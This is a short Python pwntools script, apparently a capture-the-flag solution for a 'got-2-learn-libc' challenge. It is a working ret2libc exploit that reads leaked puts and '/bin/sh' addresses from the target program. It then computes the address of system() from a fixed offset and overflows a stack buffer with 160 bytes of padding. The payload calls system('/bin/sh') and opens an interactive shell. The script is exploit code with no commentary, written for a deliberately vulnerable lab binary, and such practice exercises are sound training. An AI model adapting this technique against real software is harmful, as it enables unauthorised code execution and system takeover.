from pwn import *
import re
gdb_puts=0xf7e74140 
gdb_sys=0xf7e4f940 
offset=abs(gdb_puts-gdb_sys)
elf=ELF("/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33/vuln")
p=elf.process()
prompt=p.recv()
#print(prompt)
puts=int(re.findall('puts: (.*)', prompt)[0], 16)
bin_sh=int(re.findall('useful_string: (.*)', prompt)[0], 16)
system=puts-offset
#print("system: ",hex(system))
payload='A'*160
payload+=p32(system)
payload+='JUNK'
payload+=p32(bin_sh)
p.sendline(payload)
p.interactive()
